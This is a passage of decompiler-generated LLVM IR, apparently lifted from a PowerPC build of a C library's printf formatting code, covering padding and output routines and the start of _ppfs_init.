  %v1_1000e7e4 = load i32, i32* @r28, align 4
  %v3_1000e7e4 = trunc i32 %v0_1000e7e4 to i8
  %v4_1000e7e4 = add i32 %v1_1000e7e4, %v3_1000e7c4
  %v5_1000e7e4 = inttoptr i32 %v4_1000e7e4 to i8*
  store i8 %v3_1000e7e4, i8* %v5_1000e7e4, align 1
  %v0_1000e8a0.pre.pre = load i32, i32* @r31, align 4
  %v1_1000e8a0.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e89cthread-pre-split

dec_label_pc_1000e7ec:                            ; preds = %dec_label_pc_1000e744
  br i1 %v2_1000e7ec, label %dec_label_pc_1000e858, label %dec_label_pc_1000e7f4

dec_label_pc_1000e7f4:                            ; preds = %dec_label_pc_1000e7ec
  %v3_1000e7f8 = load i32, i32* %stack_var_-344, align 4
  %v1_1000e800 = inttoptr i32 %v3_1000e7f8 to i32*
  %v2_1000e800 = load i32, i32* %v1_1000e800, align 4
  br i1 %v3_1000e7ec, label %dec_label_pc_1000e800, label %dec_label_pc_1000e830

dec_label_pc_1000e800:                            ; preds = %dec_label_pc_1000e7f4
  store i32 %v2_1000e800, i32* %r30.global-to-local, align 4
  %v3_1000e804 = icmp eq i32 %v2_1000e800, 0
  br i1 %v3_1000e804, label %dec_label_pc_1000e884, label %dec_label_pc_1000e80c

dec_label_pc_1000e80c:                            ; preds = %dec_label_pc_1000e800, %dec_label_pc_1000e860
  %v0_1000e820 = phi i32 [ %v2_1000e800, %dec_label_pc_1000e800 ], [ %v3_1000e870, %dec_label_pc_1000e860 ]
  %v3_1000e80c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1000e80c, i32* %r0.global-to-local, align 4
  %v1_1000e814 = icmp slt i32 %v3_1000e80c, 0
  br i1 %v1_1000e814, label %dec_label_pc_1000e820, label %dec_label_pc_1000e81c

dec_label_pc_1000e81c:                            ; preds = %dec_label_pc_1000e80c
  br label %dec_label_pc_1000e820

dec_label_pc_1000e820:                            ; preds = %dec_label_pc_1000e80c, %dec_label_pc_1000e81c
  %storemerge95 = phi i32 [ %v3_1000e80c, %dec_label_pc_1000e81c ], [ -1, %dec_label_pc_1000e80c ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268494888, i32* @lr, align 4
  %v1_1000e824 = inttoptr i32 %v0_1000e820 to i8*
  %v2_1000e824 = call i32 @strnlen(i8* %v1_1000e824)
  store i32 %v2_1000e824, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000e890

dec_label_pc_1000e830:                            ; preds = %dec_label_pc_1000e7f4
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_1000e800, i32* %stack_var_-328, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_1000e864, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e89cthread-pre-split

dec_label_pc_1000e858:                            ; preds = %dec_label_pc_1000e7ec
  br i1 %v3_1000e858, label %dec_label_pc_1000e860, label %dec_label_pc_1000ea00

dec_label_pc_1000e860:                            ; preds = %dec_label_pc_1000e858
  %v0_1000e860 = call i32 @__errno_location()
  %v1_1000e868 = inttoptr i32 %v0_1000e860 to i32*
  %v2_1000e868 = load i32, i32* %v1_1000e868, align 4
  store i32 %v2_1000e868, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268494964, i32* @lr, align 4
  %v3_1000e870 = call i32 @__GI___glibc_strerror_r(i32 %v2_1000e868, i32 %v2_1000e864, i32 128)
  store i32 %v3_1000e870, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e80c

dec_label_pc_1000e87c:                            ; preds = %dec_label_pc_1000e700, %dec_label_pc_1000e6f8, %dec_label_pc_1000e6e0
  %v0_1000e8a0.pre41 = phi i32 [ %v1_1000e660, %dec_label_pc_1000e700 ], [ 0, %dec_label_pc_1000e6f8 ], [ 5, %dec_label_pc_1000e6e0 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000e89cthread-pre-split

dec_label_pc_1000e884:                            ; preds = %dec_label_pc_1000e800, %dec_label_pc_1000e760
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_10019580.596 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000e890

dec_label_pc_1000e890:                            ; preds = %dec_label_pc_1000e820, %dec_label_pc_1000e884
  %v0_1000e8a029 = phi i32 [ %v2_1000e824, %dec_label_pc_1000e820 ], [ 6, %dec_label_pc_1000e884 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1000e89c

dec_label_pc_1000e89cthread-pre-split:            ; preds = %dec_label_pc_1000e7d4, %dec_label_pc_1000e830, %dec_label_pc_1000e87c, %dec_label_pc_1000e700
  %v1_1000e8a0.pre = phi i32 [ %v2_1000e704, %dec_label_pc_1000e700 ], [ 0, %dec_label_pc_1000e87c ], [ %v1_1000e8a0.pre.pre, %dec_label_pc_1000e7d4 ], [ 0, %dec_label_pc_1000e830 ]
  %v0_1000e8a0.pre = phi i32 [ %v1_1000e660, %dec_label_pc_1000e700 ], [ %v0_1000e8a0.pre41, %dec_label_pc_1000e87c ], [ %v0_1000e8a0.pre.pre, %dec_label_pc_1000e7d4 ], [ 1, %dec_label_pc_1000e830 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1000e700 ], [ %stack_var_-184.0, %dec_label_pc_1000e87c ], [ %v0_1000e644, %dec_label_pc_1000e7d4 ], [ %v0_1000e644, %dec_label_pc_1000e830 ]
  %v0_1000e89c.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1000e89c

dec_label_pc_1000e89c:                            ; preds = %dec_label_pc_1000e89cthread-pre-split, %dec_label_pc_1000e7a0, %dec_label_pc_1000e890
  %v1_1000e8a0 = phi i32 [ %v1_1000e8a0.pre, %dec_label_pc_1000e89cthread-pre-split ], [ 0, %dec_label_pc_1000e7a0 ], [ 0, %dec_label_pc_1000e890 ]
  %v0_1000e8a0 = phi i32 [ %v0_1000e8a0.pre, %dec_label_pc_1000e89cthread-pre-split ], [ %v0_1000e790, %dec_label_pc_1000e7a0 ], [ %v0_1000e8a029, %dec_label_pc_1000e890 ]
  %v0_1000e8a8 = phi i32 [ %v0_1000e89c.pr, %dec_label_pc_1000e89cthread-pre-split ], [ 11, %dec_label_pc_1000e7a0 ], [ 11, %dec_label_pc_1000e890 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1000e89cthread-pre-split ], [ %v0_1000e644, %dec_label_pc_1000e7a0 ], [ %v0_1000e644, %dec_label_pc_1000e890 ]
  %v3_1000e89c = icmp eq i32 %v0_1000e8a8, 11
  %v2_1000e8a0 = add i32 %v0_1000e8a0, %v1_1000e8a0
  store i32 %v2_1000e8a0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000e89c, label %dec_label_pc_1000e8bc, label %dec_label_pc_1000e8a8

dec_label_pc_1000e8a8:                            ; preds = %dec_label_pc_1000e89c
  %v0_1000e8ac = call i32 @__asm_mfcr()
  %v1_1000e8b0 = call i32 @__asm_rlwinm(i32 %v0_1000e8ac, i32 30, i32 31, i32 31)
  %v1_1000e8b4 = add i32 %v1_1000e8b0, 1
  %v0_1000e8b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000e8b8 = add i32 %v0_1000e8b8, %v1_1000e8b4
  store i32 %v2_1000e8b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000e8bc

dec_label_pc_1000e8bc:                            ; preds = %dec_label_pc_1000e89c, %dec_label_pc_1000e8a8
  %v0_1000e8d4 = phi i32 [ %v2_1000e8a0, %dec_label_pc_1000e89c ], [ %v2_1000e8b8, %dec_label_pc_1000e8a8 ]
  %v3_1000e8c4 = icmp ugt i32 %tmp, %v0_1000e8d4
  br i1 %v3_1000e8c4, label %dec_label_pc_1000e8cc, label %dec_label_pc_1000e8d0

dec_label_pc_1000e8cc:                            ; preds = %dec_label_pc_1000e8bc
  %v2_1000e8cc = sub i32 %tmp, %v0_1000e8d4
  br label %dec_label_pc_1000e8d0

dec_label_pc_1000e8d0:                            ; preds = %dec_label_pc_1000e8bc, %dec_label_pc_1000e8cc
  %storemerge93 = phi i32 [ %v2_1000e8cc, %dec_label_pc_1000e8cc ], [ 0, %dec_label_pc_1000e8bc ]
  %v1_1000e8e0 = phi i32 [ %v2_1000e8cc, %dec_label_pc_1000e8cc ], [ 0, %dec_label_pc_1000e8bc ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_1000e8d0 = load i32, i32* @r26, align 4
  %v3_1000e8d0 = icmp eq i32 %v0_1000e8d0, 48
  %v2_1000e8d4 = add i32 %v1_1000e8e0, %v0_1000e8d4
  store i32 %v2_1000e8d4, i32* %r0.global-to-local, align 4
  %v0_1000e8d8 = load i32, i32* %r23.global-to-local, align 4
  %v2_1000e8d8 = add i32 %v0_1000e8d8, %v2_1000e8d4
  store i32 %v2_1000e8d8, i32* %r23.global-to-local, align 4
  br i1 %v3_1000e8d0, label %dec_label_pc_1000e8e0, label %dec_label_pc_1000e8e8

dec_label_pc_1000e8e0:                            ; preds = %dec_label_pc_1000e8d0
  %v0_1000e8e0 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000e8e0 = add i32 %v0_1000e8e0, %v1_1000e8e0
  store i32 %v2_1000e8e0, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e8e8

dec_label_pc_1000e8e8:                            ; preds = %dec_label_pc_1000e8d0, %dec_label_pc_1000e8e0
  %v0_1000e8fc = phi i32 [ %v1_1000e8e0, %dec_label_pc_1000e8d0 ], [ 0, %dec_label_pc_1000e8e0 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1000e8ec = and i32 %stack_var_-184.1, 8
  %v3_1000e8ec = icmp eq i32 %v1_1000e8ec, 0
  br i1 %v3_1000e8ec, label %dec_label_pc_1000e8f4, label %dec_label_pc_1000e910

dec_label_pc_1000e8f4:                            ; preds = %dec_label_pc_1000e8e8
  %v0_1000e8f4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268495108, i32* @lr, align 4
  %v4_1000e900 = call i32 @_charpad(i32 %v0_1000e8f4, i8 32, i32 %v0_1000e8fc)
  %v1_1000e904 = load i32, i32* @r28, align 4
  %v4_1000e904 = icmp eq i32 %v4_1000e900, %v1_1000e904
  br i1 %v4_1000e904, label %dec_label_pc_1000e90c, label %dec_label_pc_1000ea00

dec_label_pc_1000e90c:                            ; preds = %dec_label_pc_1000e8f4
  br label %dec_label_pc_1000e910

dec_label_pc_1000e910:                            ; preds = %dec_label_pc_1000e8e8, %dec_label_pc_1000e90c
  %v0_1000e914 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000e91c = load i32, i32* @r27, align 4
  %v2_1000e91c = add i32 %v0_1000e91c, ptrtoint (i32* @global_var_10019588.597 to i32)
  store i32 268495140, i32* @lr, align 4
  %v2_1000e920 = call i32 @__GI_fputs_unlocked(i32 %v2_1000e91c, i32 %v0_1000e914)
  %v0_1000e92c = load i32, i32* @r29, align 4
  store i32 268495156, i32* @lr, align 4
  %v4_1000e930 = call i32 @_charpad(i32 %v0_1000e914, i8 48, i32 %v0_1000e92c)
  %v1_1000e934 = load i32, i32* @r29, align 4
  %v4_1000e934 = icmp eq i32 %v4_1000e930, %v1_1000e934
  br i1 %v4_1000e934, label %dec_label_pc_1000e93c, label %dec_label_pc_1000ea00

dec_label_pc_1000e93c:                            ; preds = %dec_label_pc_1000e910
  %v3_1000e93c = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1000e93c, i32* %r0.global-to-local, align 4
  %v3_1000e940 = icmp eq i32 %v3_1000e93c, 0
  br i1 %v3_1000e940, label %dec_label_pc_1000e948, label %dec_label_pc_1000e970

dec_label_pc_1000e948:                            ; preds = %dec_label_pc_1000e93c
  %v0_1000e948 = load i32, i32* @r31, align 4
  %v3_1000e948 = icmp eq i32 %v0_1000e948, 0
  br i1 %v3_1000e948, label %dec_label_pc_1000e964.thread, label %dec_label_pc_1000e964

dec_label_pc_1000e964.thread:                     ; preds = %dec_label_pc_1000e948
  br label %dec_label_pc_1000e9d4

dec_label_pc_1000e964:                            ; preds = %dec_label_pc_1000e948
  %v0_1000e954 = load i32, i32* @r30, align 4
  %v0_1000e95c = load i32, i32* %r24.global-to-local, align 4
  store i32 268495204, i32* @lr, align 4
  %v4_1000e960 = inttoptr i32 %v0_1000e95c to i16*
  %v5_1000e960 = call i32 @__stdio_fwrite(i32 %v0_1000e954, i32 %v0_1000e948, i16* %v4_1000e960)
  %v1_1000e964.pre = load i32, i32* @r31, align 4
  %v4_1000e964 = icmp eq i32 %v5_1000e960, %v1_1000e964.pre
  br i1 %v4_1000e964, label %dec_label_pc_1000e9d4, label %dec_label_pc_1000ea00

dec_label_pc_1000e970:                            ; preds = %dec_label_pc_1000e93c
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000e9b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000e9b4

dec_label_pc_1000e97c:                            ; preds = %dec_label_pc_1000e9b4
  %tmp78 = icmp ult i32 %v0_1000e9cc, 129
  br i1 %tmp78, label %dec_label_pc_1000e984, label %dec_label_pc_1000e980

dec_label_pc_1000e980:                            ; preds = %dec_label_pc_1000e97c
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000e984

dec_label_pc_1000e984:                            ; preds = %dec_label_pc_1000e97c, %dec_label_pc_1000e980
  store i32 ptrtoint (i32* @global_var_1000e988.598 to i32), i32* @lr, align 4
  %v0_1000e984 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000e984, i32* @r30, align 4
  %v3_1000e98c = icmp eq i32 %v0_1000e984, 0
  br i1 %v3_1000e98c, label %dec_label_pc_1000e9a8, label %dec_label_pc_1000e9a0

dec_label_pc_1000e9a0:                            ; preds = %dec_label_pc_1000e984
  %v0_1000e990 = load i32, i32* %r24.global-to-local, align 4
  store i32 268495268, i32* @lr, align 4
  %v3_1000e9a0 = inttoptr i32 %v0_1000e990 to i16*
  %v4_1000e9a0 = call i32 @__stdio_fwrite(i32 %v2_1000e864, i32 %v0_1000e984, i16* %v3_1000e9a0)
  store i32 %v4_1000e9a0, i32* %r0.global-to-local, align 4
  %v1_1000e9a8.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000e9a8

dec_label_pc_1000e9a8:                            ; preds = %dec_label_pc_1000e984, %dec_label_pc_1000e9a0
  %v1_1000e9a8 = phi i32 [ 0, %dec_label_pc_1000e984 ], [ %v1_1000e9a8.pre, %dec_label_pc_1000e9a0 ]
  %v0_1000e9ac = phi i32 [ 0, %dec_label_pc_1000e984 ], [ %v4_1000e9a0, %dec_label_pc_1000e9a0 ]
  %v4_1000e9a8 = icmp eq i32 %v0_1000e9ac, %v1_1000e9a8
  %v1_1000e9ac = load i32, i32* @r31, align 4
  %v2_1000e9ac = sub i32 %v1_1000e9ac, %v0_1000e9ac
  store i32 %v2_1000e9ac, i32* @r31, align 4
  br i1 %v4_1000e9a8, label %dec_label_pc_1000e9b4, label %dec_label_pc_1000ea00

dec_label_pc_1000e9b4:                            ; preds = %dec_label_pc_1000e9a8, %dec_label_pc_1000e970
  %v0_1000e9cc = phi i32 [ %v2_1000e9ac, %dec_label_pc_1000e9a8 ], [ %v0_1000e9b4.pre, %dec_label_pc_1000e970 ]
  %v3_1000e9b4 = icmp eq i32 %v0_1000e9cc, 0
  store i32 %v2_1000e864, i32* @r29, align 4
  store i32 %v2_1000e784, i32* @r4, align 4
  store i32 %v2_1000e788, i32* @r6, align 4
  store i32 %v2_1000e864, i32* @r3, align 4
  store i32 %v0_1000e9cc, i32* @r5, align 4
  br i1 %v3_1000e9b4, label %dec_label_pc_1000e9d4, label %dec_label_pc_1000e97c

dec_label_pc_1000e9d4:                            ; preds = %dec_label_pc_1000e9b4, %dec_label_pc_1000e964.thread, %dec_label_pc_1000e964
  %v0_1000e9d4 = load i32, i32* %r24.global-to-local, align 4
  %v0_1000e9dc = load i32, i32* @r28, align 4
  store i32 268495332, i32* @lr, align 4
  %v4_1000e9e0 = call i32 @_charpad(i32 %v0_1000e9d4, i8 32, i32 %v0_1000e9dc)
  %v1_1000e9e4 = load i32, i32* @r28, align 4
  %v4_1000e9e4 = icmp eq i32 %v4_1000e9e0, %v1_1000e9e4
  br i1 %v4_1000e9e4, label %dec_label_pc_1000e9ec, label %dec_label_pc_1000ea00

dec_label_pc_1000e9ec:                            ; preds = %dec_label_pc_1000e9d4, %dec_label_pc_1000e73c, %dec_label_pc_1000e510
  %stack_var_-184.2 = phi i32 [ %v0_1000e644, %dec_label_pc_1000e510 ], [ %stack_var_-184.1, %dec_label_pc_1000e9d4 ], [ %v0_1000e644, %dec_label_pc_1000e73c ]
  %v3_1000e9ec = load i8*, i8** %stack_var_-200, align 4
  %v4_1000e9ec = ptrtoint i8* %v3_1000e9ec to i32
  store i32 %v4_1000e9ec, i32* @r29, align 4
  br label %dec_label_pc_1000e9f0

dec_label_pc_1000e9f0:                            ; preds = %dec_label_pc_1000e404, %dec_label_pc_1000e9ec
  %v0_1000e9f0 = phi i32 [ %v0_1000e9f0.pre, %dec_label_pc_1000e404 ], [ %v4_1000e9ec, %dec_label_pc_1000e9ec ]
  %v0_1000e644 = phi i32 [ %tmp56, %dec_label_pc_1000e404 ], [ %stack_var_-184.2, %dec_label_pc_1000e9ec ]
  br label %dec_label_pc_1000e41c

dec_label_pc_1000ea00:                            ; preds = %dec_label_pc_1000e858, %dec_label_pc_1000e9d4, %dec_label_pc_1000e964, %dec_label_pc_1000e910, %dec_label_pc_1000e8f4, %dec_label_pc_1000e7b4, %dec_label_pc_1000e784, %dec_label_pc_1000e718, %dec_label_pc_1000e458, %dec_label_pc_1000e9a8
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000ea04

dec_label_pc_1000ea04:                            ; preds = %dec_label_pc_1000e464, %dec_label_pc_1000e3dc, %dec_label_pc_1000e3f4, %dec_label_pc_1000ea00
  store i32 %v0_1000e3b0, i32* %r0.global-to-local, align 4
  %v0_1000ea08 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_1000ea08

; uselistorder directives
  uselistorder i32 %v0_1000e644, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_1000e9cc, { 1, 2, 0 }
  uselistorder i32 %v1_1000e8e0, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_1000e870, { 1, 0 }
  uselistorder i32 %v2_1000e800, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000e760, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000e644, { 1, 0 }
  uselistorder i32 %v6_1000e5fc, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_1000e5e0, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1000e5cc, { 1, 0 }
  uselistorder i32 %v1_1000e570, { 1, 0 }
  uselistorder i1 %v2_1000e564, { 1, 0 }
  uselistorder i32 %v0_1000e514, { 1, 0, 2 }
  uselistorder i32 %v1_1000e500, { 1, 0 }
  uselistorder i32 %v0_1000e4f8, { 1, 0 }
  uselistorder i32 %v1_1000e4f4, { 1, 0 }
  uselistorder i32 %v1_1000e470, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1000e438, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1000e448, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_1000e864, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_1000e4ac, { 1, 2, 0 }
  uselistorder i32 %v4_1000e4a4, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 1, 5, 4 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 188, { 1, 0 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ea04, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ea00, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_1000e9f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9d4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e9a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e984, { 1, 0 }
  uselistorder label %dec_label_pc_1000e910, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8e8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e8bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e89c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000e89cthread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000e890, { 1, 0 }
  uselistorder label %dec_label_pc_1000e820, { 1, 0 }
  uselistorder label %dec_label_pc_1000e80c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e784, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000e6bc, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_1000e66c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e650, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_1000e5dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5ac, { 1, 0 }
  uselistorder label %dec_label_pc_1000e5a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000e57c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000e504, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000e4f0.dec_label_pc_1000e4f0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000e4c8, { 1, 0 }
  uselistorder label %dec_label_pc_1000e464, { 1, 0 }
  uselistorder label %dec_label_pc_1000e458, { 1, 0 }
  uselistorder label %dec_label_pc_1000e41c, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_1000ea20 = load i32, i32* @lr, align 4
  store i32 %v0_1000ea20, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000ea30 = load i32, i32* @r4, align 4
  store i32 %v0_1000ea30, i32* @r30, align 4
  store i32 268495424, i32* @lr, align 4
  %v3_1000ea3c = call i32 @__GI_memset(i32 0, i32 160, i32 160)
  %v0_1000ea40 = load i32, i32* @r31, align 4
  %v1_1000ea40 = add i32 %v0_1000ea40, 24
  %v2_1000ea40 = inttoptr i32 %v1_1000ea40 to i32*
  %v3_1000ea40 = load i32, i32* %v2_1000ea40, align 4
  store i32 %v3_1000ea40, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_1000ea48 = load i32, i32* @r30, align 4
  %v2_1000ea48 = inttoptr i32 %v0_1000ea40 to i32*
  store i32 %v0_1000ea48, i32* %v2_1000ea48, align 4
  %v0_1000ea4c = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000ea4c, i32* %ctr.global-to-local, align 4
  %v0_1000ea50 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ea50 = add i32 %v0_1000ea50, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_1000ea58 = load i32, i32* @r31, align 4
  %v2_1000ea58 = add i32 %v1_1000ea58, 24
  %v3_1000ea58 = inttoptr i32 %v2_1000ea58 to i32*
  store i32 %v1_1000ea50, i32* %v3_1000ea58, align 4
  %v0_1000ea5c = load i32, i32* @r31, align 4
  %v1_1000ea5c = add i32 %v0_1000ea5c, 40
  store i32 %v1_1000ea5c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ea60

dec_label_pc_1000ea60:                            ; preds = %dec_label_pc_1000ea60, %entry
  %v1_1000ea60 = phi i32 [ %v1_1000ea64, %dec_label_pc_1000ea60 ], [ %v1_1000ea5c, %entry ]
  %v0_1000ea60 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000ea60 = inttoptr i32 %v1_1000ea60 to i32*
  store i32 %v0_1000ea60, i32* %v2_1000ea60, align 4
  %v0_1000ea64 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ea64 = add i32 %v0_1000ea64, 4
  store i32 %v1_1000ea64, i32* %r9.global-to-local, align 4
  %v0_1000ea68 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ea68 = add i32 %v0_1000ea68, -1
  store i32 %v1_1000ea68, i32* %ctr.global-to-local, align 4
  %v2_1000ea68 = icmp eq i32 %v1_1000ea68, 0
  br i1 %v2_1000ea68, label %dec_label_pc_1000ea6c, label %dec_label_pc_1000ea60

dec_label_pc_1000ea6c:                            ; preds = %dec_label_pc_1000ea60
  %v0_1000ea6c = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000eaac

dec_label_pc_1000ea7c:                            ; preds = %dec_label_pc_1000eaac
  %v3_1000eab4 = icmp eq i8 %v2_1000eaac, 37
  br i1 %v3_1000eab4, label %dec_label_pc_1000ea80, label %dec_label_pc_1000eaa8

dec_label_pc_1000ea80:                            ; preds = %dec_label_pc_1000ea7c
  %v1_1000ea80 = add i32 %v0_1000ea80, 1
  %v2_1000ea80 = inttoptr i32 %v1_1000ea80 to i8*
  %v3_1000ea80 = load i8, i8* %v2_1000ea80, align 1
  %v4_1000ea80 = zext i8 %v3_1000ea80 to i32
  store i32 %v4_1000ea80, i32* %r0.global-to-local, align 4
  store i32 %v1_1000ea80, i32* %r9.global-to-local, align 4
  %v3_1000ea88 = icmp eq i8 %v3_1000ea80, 37
  br i1 %v3_1000ea88, label %dec_label_pc_1000eaa8, label %dec_label_pc_1000ea90

dec_label_pc_1000ea90:                            ; preds = %dec_label_pc_1000ea80
  %v0_1000ea84 = load i32, i32* @r31, align 4
  %v2_1000ea90 = inttoptr i32 %v0_1000ea84 to i32*
  store i32 %v1_1000ea80, i32* %v2_1000ea90, align 4
  store i32 268495512, i32* @lr, align 4
  %v1_1000ea94 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ea94 = call i32 @_ppfs_parsespec(i32* %v2_1000ea90, i32 %v1_1000ea94)
  %v1_1000ea98 = icmp slt i32 %v3_1000ea94, 0
  br i1 %v1_1000ea98, label %dec_label_pc_1000eac4, label %dec_label_pc_1000eaa0

dec_label_pc_1000eaa0:                            ; preds = %dec_label_pc_1000ea90
  %v0_1000eaa0 = load i32, i32* @r31, align 4
  %v1_1000eaa0 = inttoptr i32 %v0_1000eaa0 to i32*
  %v2_1000eaa0 = load i32, i32* %v1_1000eaa0, align 4
  br label %dec_label_pc_1000eaac

dec_label_pc_1000eaa8:                            ; preds = %dec_label_pc_1000ea7c, %dec_label_pc_1000ea80
  %v0_1000eaa8 = phi i32 [ %v0_1000ea80, %dec_label_pc_1000ea7c ], [ %v1_1000ea80, %dec_label_pc_1000ea80 ]
  %v1_1000eaa8 = add i32 %v0_1000eaa8, 1
  br label %dec_label_pc_1000eaac

dec_label_pc_1000eaac:                            ; preds = %dec_label_pc_1000eaa0, %dec_label_pc_1000eaa8, %dec_label_pc_1000ea6c
  %v0_1000ea80 = phi i32 [ %v0_1000ea6c, %dec_label_pc_1000ea6c ], [ %v1_1000eaa8, %dec_label_pc_1000eaa8 ], [ %v2_1000eaa0, %dec_label_pc_1000eaa0 ]
  store i32 %v0_1000ea80, i32* %r9.global-to-local, align 4
